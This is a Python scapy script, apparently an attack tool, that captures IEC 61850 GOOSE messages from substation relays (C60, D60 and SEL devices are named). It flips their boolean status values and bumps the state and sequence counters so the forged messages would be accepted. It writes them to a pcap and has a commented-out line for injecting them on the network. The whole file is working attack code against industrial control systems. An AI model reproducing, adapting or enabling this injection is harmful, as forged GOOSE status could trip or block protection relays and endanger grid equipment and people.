from scapy.all import *
import goose
import sys, signal
import time, datetime

DEBUG = 2
filetime = datetime.datetime.fromtimestamp(int(time.time())).strftime('%Y%m%d%H%M%S')
#ONF_ORIG = 'goose_orig_' + filetime + '.pcap'
ONF_MOD  = '/tmp/goose_mod_' + filetime + '.pcap'
GOOSE_TYPE = 0x88b8
# Device names to concentrate interactions
deviceName = ['C60_Device1','C60-Device2','D60-Device3','SEL-Device4']
RAPID_SEND = 3

def signal_handler(sig,frame):
    print('Manual interrupt captured: cntl-c')
    sys.exit()

def scapyWrite(pkt):
    if DEBUG: print('In scapyWrite')
    wrpcap(ONF_MOD, pkt, append=True)  #appends packet to output file

def timeToString(t):
    if DEBUG: print('In timeToString')
    t4r = struct.unpack('>i',t[:4])[0]
    ptime = datetime.datetime.fromtimestamp(t4r).strftime('%Y-%m-%d- %H:%M:%S')
    return ptime

def curTimeBytes():
    if DEBUG: print('In curTimeBytes')
    curTime = int(time.time())
    curTimeBytes = struct.pack('>i',int(time.time()))
    return curTimeBytes
    
def modPacket(pkt):
    if DEBUG > 1: print('In modPacket: %r\n\n'%(pkt))
    pktData = pkt.allData.load
    if DEBUG > 1: print('modPacket - pktData: %r\n\n'%(pktData))
    i = 0
    newData = b''
    while i < len(pktData):
        newSub = b''
        if pktData[i] == ord(b'\x83'):
            newSub = pktData[i:i+pktData[i+1]+2]
            if newSub == b'\x83\x01\x00':
                newSub = b'\x83\x01\x01'
            else:
                newSub = b'\x83\x01\x00'
        else:
            newSub = pktData[i:i+pktData[i+1]+2]
        newData += newSub
        i = i + pktData[i+1] + 2
    return newData

IGNORE_T = []

def gooseCheck(p):
    isGoose = False
    if p.haslayer('Dot1Q'):
        if p[Dot1Q].type == GOOSE_TYPE: isGoose = True
    if p.haslayer('Ether'):
        if p[Ether].type == GOOSE_TYPE: isGoose = True
    if isGoose:
        try:
            #if DEBUG: print('isGoose')
            #if DEBUG > 1: print('goID: %r'%p.getfieldval('goID').load)
            #goID = p.getfieldval('goID').load.decode()
            goID = p.getfieldval('goID').load.decode()
            #if DEBUG > 1: print('t: %r'%p.getfieldval('t').load)
            t = p.getfieldval('t').load
            if t in IGNORE_T: return
            if DEBUG: print('goID: %r'%(goID))
            #if goID in deviceName:
            if goID:
                if DEBUG: print('modData p: %r\n\n'%(p))
                modData = modPacket(p)
                p.setfieldval('allData',modData)
                if DEBUG: print('modData modded p: %r\n\n'%(p))
                #scapyWrite(newPkt)
                try:
                    print('Sending: %r\n\n'%(p))
                    if DEBUG: print('Sending packets')
                    IGNORE_T.append(t)
                    #if DEBUG: print('stNum get: %r'%(stNum))
                    stNum = p.getfieldval('stNum').load.decode()
                    if DEBUG: print('stNum get: %r'%(stNum))
                    stNum = chr(ord(stNum) + 1)
                    if DEBUG: print('stNum set: %r'%(stNum))
                    p.setfieldval('stNum',stNum)
                    if DEBUG: print('stNum go')
                    if DEBUG: print('sqNum get: %r'%(p.getfieldval('sqNum').load))
                    sqNum = p.getfieldval('sqNum').load
                    if DEBUG > 1: print('sqNumLen: %r'%(p.getfieldval('sqNumLen')))
                    for e in range(RAPID_SEND):
                        sqNumLen = p.getfieldval('sqNumLen')
                        sqNum = (int.from_bytes(sqNum,'big') + 1).to_bytes(sqNumLen,'big')
                        #p.setfieldval('sqNum', chr(0) + chr(0) + chr(sqNum))
                        p.setfieldval('sqNum', sqNum)
                        if DEBUG: print('sqNum set: %r'%(sqNum))
                        scapyWrite(p)
                        #sendp(p,iface="eth0")
                except Exception as e:
                    print('Failed to send: %s: %r'%(e,p))
                    return 1
                    #pass
        except Exception as e:
            print('Failed to send: %s: %r'%(e,p))
            return 1
            #pass
        return 0

if __name__ == "__main__":
    # Allow user to exit program
    signal.signal(signal.SIGINT,signal_handler)

    # Read packets from packet capture
    if len(sys.argv) > 1:
        INF = sys.argv[1]
        packets = rdpcap(INF)
        for p in packets:
            if gooseCheck(p): break
    # Else, sniff packets
    else:
        # Only capture Goose messages
        packets = sniff(count=1000,prn=gooseCheck,filter='ether proto 0x88b8',store=False)
